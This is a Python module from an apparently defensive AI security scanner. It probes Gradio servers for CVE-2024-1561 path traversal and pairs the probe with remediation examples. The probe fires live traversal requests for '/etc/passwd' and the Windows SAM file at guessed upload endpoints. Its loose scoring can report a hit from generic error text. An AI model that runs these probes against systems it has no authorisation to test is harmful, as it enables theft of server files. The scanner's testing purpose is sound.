"""
CVE-2024-1561: Gradio Arbitrary File Read via Upload Path Traversal
Exploits file upload path handling to read arbitrary files from the server.
Maps to OWASP LLM05, CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
"""
import re
import httpx
from app.attacks.base import BaseAttack

class CVEGradioUpload(BaseAttack):
    attack_id = "cve_gradio_arb_upload_2024"
    name = "CVE-2024-1561: Gradio File Read via Path Traversal"
    category = "real_world_cves"
    severity = "high"
    description = "Arbitrary file read via path traversal in Gradio upload endpoint (CVE-2024-1561)"
    framework_mapping = {
        "OWASP LLM Top 10": "LLM05",
        "CWE": "CWE-22",
        "CVE": "CVE-2024-1561",
    }

    async def build_payload(self, target_config: dict) -> str:
        """
        Build payload for Gradio file traversal attack.

        Vulnerable pattern:
        - Gradio upload endpoint: /upload or /file
        - Processes path parameter without proper sanitization
        - Allows "../" sequences in path parameter

        Attack: /upload?path=../../etc/passwd
        """
        return "gradio_file_upload_traversal_test"

    async def evaluate_response(self, response: str, target_config: dict) -> tuple[bool, float]:
        """
        Evaluate Gradio path traversal vulnerability by testing:
        1. Upload endpoint accessibility
        2. Path traversal sequences in file parameter
        3. Ability to read system files (/etc/passwd, /etc/hostname)
        4. Evidence of file content disclosure
        """
        confidence_score = 0.0

        try:
            # Extract endpoint from target config
            endpoint = target_config.get("endpoint_url", "")
            if not endpoint:
                return False, 0.0

            # Test 1: Check for Gradio app (common Gradio endpoints)
            gradio_indicators = [
                "/gradio_api",
                "/api/gradio",
                "/upload",
                "/file",
            ]

            # Test 2: Attempt path traversal for common sensitive files
            traversal_paths = [
                "../../../../etc/passwd",
                "../../../etc/passwd",
                "../../etc/passwd",
                "../../etc/hostname",
                "../../etc/os-release",
                "....//....//etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",  # Windows
            ]

            async with httpx.AsyncClient(timeout=10) as client:
                for path in traversal_paths:
                    try:
                        # Try various Gradio upload endpoint patterns
                        endpoints_to_try = [
                            f"{endpoint}/upload?path={path}",
                            f"{endpoint}/file?path={path}",
                            f"{endpoint}/api/upload?path={path}",
                            f"{endpoint}/gradio_api/upload?path={path}",
                        ]

                        for test_endpoint in endpoints_to_try:
                            try:
                                upload_response = await client.get(
                                    test_endpoint,
                                    timeout=5
                                )

                                # Success indicators
                                if upload_response.status_code == 200:
                                    # Check for file contents
                                    if "root:" in upload_response.text or "bin/bash" in upload_response.text:
                                        confidence_score += 0.40
                                        break
                                    elif "etc" in upload_response.text or "uid=" in upload_response.text:
                                        confidence_score += 0.30
                                        break

                                # Also try POST method
                                post_response = await client.post(
                                    test_endpoint,
                                    json={"path": path},
                                    timeout=5
                                )

                                if post_response.status_code == 200:
                                    if "root:" in post_response.text:
                                        confidence_score += 0.40
                                        break

                            except Exception:
                                pass

                    except Exception:
                        pass

            # Test 3: Check response text for file content indicators
            response_lower = response.lower()

            # System file content indicators
            system_file_indicators = [
                r'root:.*:0:0:',  # /etc/passwd format
                r'\/bin\/(?:sh|bash)',
                r'\/etc\/(?:passwd|hostname|os-release)',
                r'uid=0\(root\)',
            ]

            for indicator in system_file_indicators:
                if re.search(indicator, response):
                    confidence_score += 0.25

            # Gradio-specific error messages
            gradio_errors = [
                r'gradio.*upload',
                r'file.*not.*found',
                r'path.*invalid',
                r'upload.*endpoint',
            ]

            for error in gradio_errors:
                if re.search(error, response_lower):
                    confidence_score += 0.10

            # Check for file directory listing
            if re.search(r'(?:directory|folder).*listing|ls\s*-la', response_lower):
                confidence_score += 0.15

            # Determine success based on confidence accumulation
            if confidence_score >= 0.55:
                return True, min(0.90, confidence_score)
            elif confidence_score >= 0.35:
                return True, confidence_score
            elif confidence_score >= 0.20:
                return True, confidence_score * 0.75

            return False, max(0.0, confidence_score * 0.3)

        except Exception as e:
            return False, 0.0

    def get_remediation(self) -> dict:
        """Return remediation strategies for CVE-2024-1561."""
        return {
            "description": "Patch Gradio path traversal vulnerability by sanitizing file paths",
            "code_examples": [
                {
                    "language": "bash",
                    "title": "Update Gradio to patched version",
                    "code": """
# CVE-2024-1561 was fixed in Gradio >= 4.37.0
# Update requirements.txt:
# gradio>=4.37.0

# Upgrade existing installation:
pip install --upgrade gradio>=4.37.0

# Verify version:
python -c "import gradio; print(f'Gradio: {gradio.__version__}')"
"""
                },
                {
                    "language": "python",
                    "title": "Proper file path sanitization in upload handler",
                    "code": """
import os
from pathlib import Path
from fastapi import FastAPI, UploadFile, HTTPException

app = FastAPI()

# UNSAFE: Do not do this
async def upload_file_UNSAFE(path: str, file: UploadFile):
    '''VULNERABLE to path traversal!'''
    # Attacker can use: path=../../etc/passwd
    filepath = os.path.join('/uploads', path)
    with open(filepath, 'wb') as f:
        f.write(await file.read())
    return {'status': 'uploaded'}

# SAFE: Validate and sanitize paths
async def upload_file_SAFE(path: str, file: UploadFile):
    '''Safe file upload with path validation.'''
    UPLOAD_DIR = Path('/uploads').resolve()

    # Sanitize path: remove path traversal sequences
    sanitized_path = Path(path).name  # Get filename only, remove directory components

    # Block dangerous patterns
    if ".." in path or path.startswith('/'):
        raise HTTPException(status_code=400, detail="Invalid path")

    # Ensure resolved path is within upload directory
    target_path = (UPLOAD_DIR / sanitized_path).resolve()

    if not str(target_path).startswith(str(UPLOAD_DIR)):
        raise HTTPException(status_code=400, detail="Path outside upload directory")

    # Create upload directory if needed
    target_path.parent.mkdir(parents=True, exist_ok=True)

    # Write file
    with open(target_path, 'wb') as f:
        f.write(await file.read())

    return {'status': 'uploaded', 'path': str(target_path.relative_to(UPLOAD_DIR))}
"""
                },
                {
                    "language": "python",
                    "title": "Gradio secure configuration with file restrictions",
                    "code": """
import gradio as gr
from pathlib import Path
import os

# Define allowed upload directory
UPLOAD_DIR = Path('./uploads').resolve()
UPLOAD_DIR.mkdir(exist_ok=True)

# SAFE: Restrict file access to specific directory
def safe_file_upload(file):
    '''Handle file upload safely.'''
    if file is None:
        return {"description": "No file uploaded", "steps": [], "references": []}

    # Get filename only (no path)
    filename = Path(file.name).name

    # Save to allowed directory
    filepath = UPLOAD_DIR / filename

    # Verify path is within allowed directory
    try:
        resolved_path = filepath.resolve()
        if not str(resolved_path).startswith(str(UPLOAD_DIR)):
            return {"description": "Error: File path outside allowed directory", "steps": [], "references": []}
    except (ValueError, RuntimeError):
        return {"description": "Error: Invalid file path", "steps": [], "references": []}

    # Save file
    with open(filepath, 'wb') as f:
        f.write(file)

    return f"File saved: {filename}"

# Create Gradio interface with file upload restrictions
with gr.Blocks() as demo:
    gr.Markdown("# Secure File Upload")

    with gr.Row():
        file_input = gr.File(label="Upload File", type="binary")
        output = gr.Textbox(label="Status")

    upload_btn = gr.Button("Upload")
    upload_btn.click(
        fn=safe_file_upload,
        inputs=file_input,
        outputs=output
    )

demo.launch(share=False)
"""
                },
                {
                    "language": "python",
                    "title": "Implement allowlist for file extensions",
                    "code": """
from pathlib import Path

class SecureFileUploader:
    def __init__(self, upload_dir: str, allowed_extensions: list[str]):
        self.upload_dir = Path(upload_dir).resolve()
        self.allowed_extensions = set(ext.lower() for ext in allowed_extensions)
        self.upload_dir.mkdir(parents=True, exist_ok=True)

    def upload_file(self, filename: str, content: bytes) -> dict:
        '''Upload file with validation.'''
        # 1. Validate filename (no path components)
        file_path = Path(filename)
        if len(file_path.parts) > 1:
            raise ValueError("Subdirectories not allowed")

        # 2. Validate extension
        ext = file_path.suffix.lower()
        if ext not in self.allowed_extensions:
            raise ValueError(f"File type {ext} not allowed")

        # 3. Validate filename doesn't contain traversal
        if ".." in filename:
            raise ValueError("Invalid filename")

        # 4. Resolve and validate path is within upload directory
        target_path = (self.upload_dir / file_path).resolve()
        if not str(target_path).startswith(str(self.upload_dir)):
            raise ValueError("Path outside upload directory")

        # 5. Write file
        target_path.write_bytes(content)

        return {
            'success': True,
            'filename': file_path.name,
            'path': str(target_path.relative_to(self.upload_dir))
        }

# Usage
uploader = SecureFileUploader(
    upload_dir='./uploads',
    allowed_extensions=['.pdf', '.txt', '.csv', '.json']
)
"""
                }
            ],
            "references": [
                "CVE-2024-1561: Gradio Arbitrary File Read",
                "OWASP LLM Top 10 - LLM05: Supply Chain Vulnerabilities",
                "CWE-22: Improper Limitation of a Pathname to a Restricted Directory",
                "OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal",
            ],
            "best_practices": [
                "UPDATE IMMEDIATELY: Upgrade Gradio to version 4.37.0 or later",
                "Validate all file paths to prevent traversal sequences (../, ..\\)",
                "Use Path.resolve() to resolve paths and verify they're within allowed directory",
                "Implement whitelist of allowed file extensions",
                "Never trust user-supplied filenames - sanitize them",
                "Store uploaded files outside web root if possible",
                "Implement file upload size limits",
                "Log all file upload attempts for security monitoring",
                "Use unique filenames (UUID) instead of user-provided names",
                "Run Gradio app with minimal file system permissions",
                "Regularly scan uploaded files for malware",
            ],
            "impact": "HIGH: Information disclosure - arbitrary files can be read from server filesystem",
            "attack_prerequisites": [
                "Gradio version < 4.37.0",
                "File upload endpoint accessible",
                "No path validation implemented",
            ]
        }

    def _describe_finding(self) -> str:
        return "CVE-2024-1561 File Traversal confirmed: Arbitrary files can be read via path traversal in upload endpoint"
